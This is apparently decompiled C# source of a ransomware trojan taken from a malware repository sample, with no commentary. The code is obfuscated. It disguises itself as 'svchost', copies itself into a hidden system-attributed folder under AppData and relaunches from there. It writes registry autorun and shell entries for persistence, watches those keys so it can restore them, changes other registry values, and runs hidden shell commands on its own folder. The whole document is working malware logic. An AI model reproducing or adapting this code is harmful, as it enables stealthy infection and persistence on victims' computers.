// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0003\u2001
{
  private static \u0003\u2002 \u0002;
  private static \u0003\u2002 \u0003;
  private static int \u0005 = 0;

  public void \u0002()
  {
    this.\u0005();
    this.\u0008();
    this.\u0003();
    new Thread(new ThreadStart(this.\u0006)).Start();
  }

  private void \u0003()
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string executablePath = Application.ExecutablePath;
    if (!Directory.Exists(folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F))
      Directory.CreateDirectory(folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F).Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
    if (File.Exists(folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000E))
      return;
    File.Copy(executablePath, folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000E);
    FileInfo fileInfo = new FileInfo(folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000E);
    \u0003\u2001.\u0002(folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F, \u000F\u2001.\u000E);
    fileInfo.Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden;
    Process.Start(folderPath + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000E);
    Environment.Exit(0);
  }

  public static void \u0002()
  {
    \u0003\u2001.\u0002.\u0005();
    \u0003\u2001.\u0003.\u0005();
    (!\u0006\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine).OpenSubKey(\u0005\u2003.\u0002(1067755214), true).SetValue(\u000F\u2001.\u0002\u2000, (object) string.Empty);
    string name = \u0005\u2003.\u0002(1067755322);
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000E;
    RegistryKey registryKey1 = !\u0006\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine;
    RegistryKey registryKey2;
    using (registryKey2 = registryKey1.OpenSubKey(\u0005\u2003.\u0002(1067755278), true))
    {
      if (registryKey2.GetValue(name) == null)
      {
        registryKey2.SetValue(name, (object) \u0005\u2003.\u0002(1067755378));
      }
      else
      {
        string str2 = registryKey2.GetValue(name).ToString();
        if (!str2.Contains(str1))
          registryKey2.SetValue(name, (object) str2);
      }
    }
    Environment.Exit(0);
  }

  public static void \u0002(string _param0, string _param1)
  {
    try
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = \u0005\u2003.\u0002(1067755359),
        RedirectStandardInput = true,
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
      };
      process.Start();
      StreamWriter standardInput = process.StandardInput;
      standardInput.WriteLine(\u0005\u2003.\u0002(1067755345) + _param0);
      standardInput.WriteLine(\u0005\u2003.\u0002(1067755435) + _param1 + \u0005\u2003.\u0002(1067755392));
      standardInput.WriteLine(\u0005\u2003.\u0002(1067755497));
      standardInput.Close();
    }
    catch
    {
    }
  }

  private void \u0005()
  {
    RegistryKey registryKey1 = (!\u0006\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine).OpenSubKey(\u0005\u2003.\u0002(1067755490), true);
    if (registryKey1 != null && registryKey1.GetValue(\u0005\u2003.\u0002(1067754530)) != null)
      registryKey1.SetValue(\u0005\u2003.\u0002(1067754530), (object) \u0005\u2003.\u0002(1067755131));
    RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(\u0005\u2003.\u0002(1067755490), true);
    if (registryKey2 != null && registryKey2.GetValue(\u0005\u2003.\u0002(1067754546)) != null)
      registryKey2.SetValue(\u0005\u2003.\u0002(1067754546), (object) \u0005\u2003.\u0002(1067755131));
    RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(\u0005\u2003.\u0002(1067754605), true);
    if (registryKey3 == null || registryKey3.GetValue(\u0005\u2003.\u0002(1067754671)) == null)
      return;
    registryKey3.SetValue(\u0005\u2003.\u0002(1067754671), (object) \u0005\u2003.\u0002(1067754658));
  }

  private void \u0008()
  {
    string name = \u0005\u2003.\u0002(1067755322);
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000F + \u0005\u2003.\u0002(1067755254) + \u000F\u2001.\u000E;
    RegistryKey registryKey1 = !\u0006\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine;
    RegistryKey registryKey2;
    using (registryKey2 = registryKey1.OpenSubKey(\u0005\u2003.\u0002(1067755278), true))
    {
      if (registryKey2.GetValue(name) == null)
      {
        registryKey2.SetValue(name, (object) (\u0005\u2003.\u0002(1067754682) + str1));
      }
      else
      {
        string str2 = registryKey2.GetValue(name).ToString();
        if (!str2.Contains(str1))
          registryKey2.SetValue(name, (object) (str2 + str1));
      }
    }
    (!\u0006\u2001.\u0002() ? Registry.CurrentUser : Registry.LocalMachine).OpenSubKey(\u0005\u2003.\u0002(1067755214), true).SetValue(\u000F\u2001.\u0002\u2000, (object) str1);
  }

  private void \u0006()
  {
    List<string> stringList = new List<string>();
    if (\u0006\u2001.\u0002())
    {
      stringList.Add(Registry.LocalMachine.Name + \u0005\u2003.\u0002(1067754630));
      stringList.Add(Registry.LocalMachine.Name + \u0005\u2003.\u0002(1067754693));
    }
    else
    {
      stringList.Add(Registry.CurrentUser.Name + \u0005\u2003.\u0002(1067754630));
      stringList.Add(Registry.CurrentUser.Name + \u0005\u2003.\u0002(1067754693));
    }
    \u0003\u2001.\u0002 = new \u0003\u2002(stringList[0]);
    \u0003\u2001.\u0003 = new \u0003\u2002(stringList[1]);
    \u0003\u2001.\u0002.\u0002(new EventHandler(this.\u0002));
    \u0003\u2001.\u0003.\u0002(new EventHandler(this.\u0002));
    \u0003\u2001.\u0002.\u0003();
    \u0003\u2001.\u0003.\u0003();
  }

  private void \u0002(object _param1, EventArgs _param2)
  {
    if (\u0003\u2001.\u0005 <= 5)
      \u000E\u2001.\u0002.\u0002(\u0005\u2003.\u0002(1067754800), \u000F\u2001.\u0005, \u0005\u2003.\u0002(1067754862));
    ++\u0003\u2001.\u0005;
    this.\u0008();
  }
}
